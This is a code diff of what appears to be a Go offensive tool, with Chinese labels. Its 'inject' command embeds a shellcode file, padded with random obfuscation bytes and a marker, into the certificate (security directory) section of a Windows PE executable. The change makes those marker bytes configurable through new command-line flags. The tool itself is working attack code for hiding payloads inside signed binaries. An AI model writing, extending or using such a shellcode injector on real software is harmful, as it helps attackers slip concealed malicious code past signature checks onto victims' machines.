@@ -4,10 +4,12 @@ import (
 	"crypto/rand"
 	"debug/pe"
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"github.com/spf13/cobra"
 	"io"
 	"io/ioutil"
+	"log"
 	"os"
 )
 
@@ -175,12 +177,12 @@ func main() {
 
 	var crackerCmd = &cobra.Command{
 		Use:   "crack",
-		Short: "针对文件头的crack",
+		Short: "文件头证书区段感染",
 	}
 
 	var injectCmd = &cobra.Command{
-		Use:   "inject [PeFile] [output] [ShellcodeFile]",
-		Short: "注入shellcode至PE文件",
+		Use:   "inject [PeFile] [output] [ShellcodeFile] [Optional:embedData]",
+		Short: "注入shellcode",
 		Args:  cobra.ExactArgs(3),
 		Run: func(cmd *cobra.Command, args []string) {
 			file, err := os.OpenFile(args[0], os.O_RDWR|os.O_CREATE, 0644)
@@ -202,7 +204,10 @@ func main() {
 			shellcode, err := ioutil.ReadFile(args[2])
 			check(err)
 
-			paddingSize := 8 - (len(shellcode) % 8)
+			sizeOfShc := len(shellcode)
+			fmt.Println("[*] size of shellcode:", sizeOfShc)
+
+			paddingSize := 8 - (sizeOfShc % 8)
 			if paddingSize == 8 {
 				paddingSize = 0
 			}
@@ -212,8 +217,27 @@ func main() {
 			obfusPadding := make([]byte, obfusSize)
 			obfusPadding, err = GenerateRandomBytes(obfusSize)
 
-			embedData := make([]byte, 8)
-			embedData = []byte{0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef}
+			embedDataStr, _ := cmd.Flags().GetString("embedData")
+			embedSize, _ := cmd.Flags().GetInt("embedSize")
+			var embedData []byte
+
+			embedDataFlag := cmd.Flags().Lookup("embedData").Changed
+			embedSizeFlag := cmd.Flags().Lookup("embedSize").Changed
+
+			if embedDataFlag && embedSizeFlag {
+				var err error
+				embedData, err = hexStringToBytes(embedDataStr)
+				if err != nil {
+					log.Fatalf("无效的embedData: %v", err)
+				}
+				if len(embedData) != embedSize {
+					log.Fatalf("embedData的长度 (%d) 与 embedSize (%d) 不匹配", len(embedData), embedSize)
+				}
+			} else if !embedDataFlag && !embedSizeFlag {
+				embedData = []byte{0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef}
+			} else {
+				log.Fatalf("embedData 和 embedSize 必须一起使用")
+			}
 
 			outFile, err := os.OpenFile(args[1], os.O_RDWR|os.O_CREATE, 0644)
 			check(err)
@@ -249,10 +273,12 @@ func main() {
 			_, err = outFile.Write(buf)
 			check(err)
 
-			fmt.Println("PE文件修改成功")
+			fmt.Println("[*] PE文件修改成功")
 		},
 	}
 
+	injectCmd.Flags().Int("embedSize", 8, "(可选)自定义标注数据长度")
+	injectCmd.Flags().String("embedData", "", "(可选)自定义标注数据")
 	replacerCmd.AddCommand(extractCmd, importCmd)
 	crackerCmd.AddCommand(injectCmd)
 	rootCmd.AddCommand(replacerCmd, crackerCmd)
@@ -277,4 +303,16 @@ func getSecurityDirectorySizeOffset(file *os.File, is64Bit bool) int64 {
 	}
 
 	return SecurityDirectorySizeOffset
+}
+
+func hexStringToBytes(hexStr string) ([]byte, error) {
+	if len(hexStr) >= 2 && hexStr[:2] == "0x" {
+		hexStr = hexStr[2:]
+	}
+
+	bytes, err := hex.DecodeString(hexStr)
+	if err != nil {
+		return nil, err
+	}
+	return bytes, nil
 }
